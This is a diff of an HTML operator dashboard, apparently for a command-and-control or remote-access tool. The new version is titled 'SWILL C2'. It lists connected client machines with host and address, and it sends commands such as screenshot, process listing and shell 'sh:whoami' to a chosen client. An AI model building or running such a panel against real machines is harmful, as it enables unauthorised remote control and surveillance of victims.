@@ -1,74 +1,108 @@
-<!doctype html>
-<html lang="ru">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="csrf-token" content="{{ csrf_token }}">
-  <title>Remote Tool — Dashboard</title>
-  <style>
-    body{font-family:system-ui,sans-serif;background:#111;color:#eee;margin:0;padding:1rem}
-    header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}
-    button{padding:.5rem .9rem;border:0;border-radius:8px;background:#3b82f6;
-           color:#fff;cursor:pointer}
-    button:hover{background:#2563eb}
-    #clients{display:grid;gap:.5rem;margin-bottom:1rem}
-    .client{background:#1c1c1c;padding:.7rem;border-radius:8px;cursor:pointer;
-            border:1px solid #222}
-    .client.active{border-color:#3b82f6}
-    #cmd{width:100%;padding:.6rem;border-radius:8px;border:1px solid #333;
-         background:#0d0d0d;color:#eee;box-sizing:border-box}
-    #out{white-space:pre-wrap;background:#0d0d0d;padding:1rem;border-radius:8px;
-         margin-top:1rem;min-height:200px;border:1px solid #222;overflow:auto;max-height:60vh}
-  </style>
+<meta charset="utf-8">
+<title>SWILL C2</title>
+<style>
+  body { font-family: monospace; background: #111; color: #ddd; margin: 0; padding: 20px; }
+  h1 { color: #0f0; }
+  input, button, select { background: #222; color: #ddd; border: 1px solid #444; padding: 6px; margin: 4px; }
+  button { cursor: pointer; }
+  button:hover { background: #333; }
+  #clients { margin-top: 20px; }
+  .client { border: 1px solid #333; padding: 10px; margin: 8px 0; }
+  #output { background: #000; border: 1px solid #333; padding: 10px; min-height: 200px; white-space: pre-wrap; margin-top: 20px; }
+  .hidden { display: none; }
+</style>
 </head>
 <body>
-  <header>
-    <h2>Remote Tool — Dashboard</h2>
-    <form method="post" action="/logout">
-      <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
-      <button type="submit">Выйти</button>
-    </form>
-  </header>
+<h1>SWILL C2</h1>
 
+<div id="login">
+  <input id="user" placeholder="username">
+  <input id="pass" type="password" placeholder="password">
+  <button onclick="doLogin()">Login</button>
+</div>
+
+<div id="panel" class="hidden">
+  <div>
+    <button onclick="loadClients()">Refresh clients</button>
+    <button onclick="logout()">Logout</button>
+  </div>
   <div id="clients"></div>
-  <input id="cmd" placeholder="Команда (например: info, screenshot, sh:whoami)">
-  <button id="send">Отправить</button>
-  <div id="out"></div>
+  <div>
+    <input id="cmd" placeholder="command (e.g. screenshot, proclist, sh:whoami)" size="50">
+    <select id="target"></select>
+    <button onclick="sendCmd()">Send</button>
+  </div>
+  <div id="output"></div>
+</div>
 
 <script>
-const csrf = document.querySelector('meta[name="csrf-token"]').content;
-let selected = null;
+let token = localStorage.getItem("swill_token") || "";
 
-async function refresh() {
-  const r = await fetch('/api/clients', {credentials: 'same-origin'});
-  if (r.status === 401) { location.href = '/login'; return; }
-  const list = await r.json();
-  const box = document.getElementById('clients');
-  box.innerHTML = '';
-  for (const c of list) {
-    const d = document.createElement('div');
-    d.className = 'client' + (c.id === selected ? ' active' : '');
-    d.textContent = `${c.id} — ${c.info?.os || '?'} / ${c.info?.user || '?'} (${c.info?.host || '?'})`;
-    d.onclick = () => { selected = c.id; refresh(); };
-    box.appendChild(d);
-  }
+function show() {
+  document.getElementById("login").classList.toggle("hidden", !!token);
+  document.getElementById("panel").classList.toggle("hidden", !token);
+  if (token) loadClients();
 }
 
-document.getElementById('send').onclick = async () => {
-  const cmd = document.getElementById('cmd').value.trim();
-  if (!selected || !cmd) return;
-  const r = await fetch('/api/command', {
-    method: 'POST',
-    credentials: 'same-origin',
-    headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrf},
-    body: JSON.stringify({client_id: selected, cmd})
+async function doLogin() {
+  const r = await fetch("/api/login", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      username: document.getElementById("user").value,
+      password: document.getElementById("pass").value
+    })
   });
-  const out = document.getElementById('out');
-  out.textContent = r.ok ? `[+] Отправлено: ${cmd}` : `[!] Ошибка: ${r.status}`;
-  document.getElementById('cmd').value = '';
-};
+  if (!r.ok) { alert("login failed"); return; }
+  const j = await r.json();
+  token = j.token;
+  localStorage.setItem("swill_token", token);
+  show();
+}
 
-setInterval(refresh, 5000);
-refresh();
+function logout() {
+  token = "";
+  localStorage.removeItem("swill_token");
+  show();
+}
+
+async function loadClients() {
+  const r = await fetch("/api/clients", {headers: {Authorization: "Bearer " + token}});
+  if (!r.ok) { logout(); return; }
+  const j = await r.json();
+  const box = document.getElementById("clients");
+  const sel = document.getElementById("target");
+  box.innerHTML = "";
+  sel.innerHTML = "";
+  j.clients.forEach(c => {
+    const d = document.createElement("div");
+    d.className = "client";
+    d.textContent = `${c.id} | ${c.host} | ${c.addr[0]}:${c.addr[1]}`;
+    box.appendChild(d);
+    const o = document.createElement("option");
+    o.value = c.id;
+    o.textContent = c.id;
+    sel.appendChild(o);
+  });
+}
+
+async function sendCmd() {
+  const cmd = document.getElementById("cmd").value;
+  const cid = document.getElementById("target").value;
+  if (!cmd || !cid) return;
+  const r = await fetch("/api/command", {
+    method: "POST",
+    headers: {"Content-Type": "application/json", Authorization: "Bearer " + token},
+    body: JSON.stringify({client_id: cid, cmd})
+  });
+  const j = await r.json();
+  document.getElementById("output").textContent += JSON.stringify(j) + "\n";
+}
+
+show();
 </script>
 </body>
 </html>
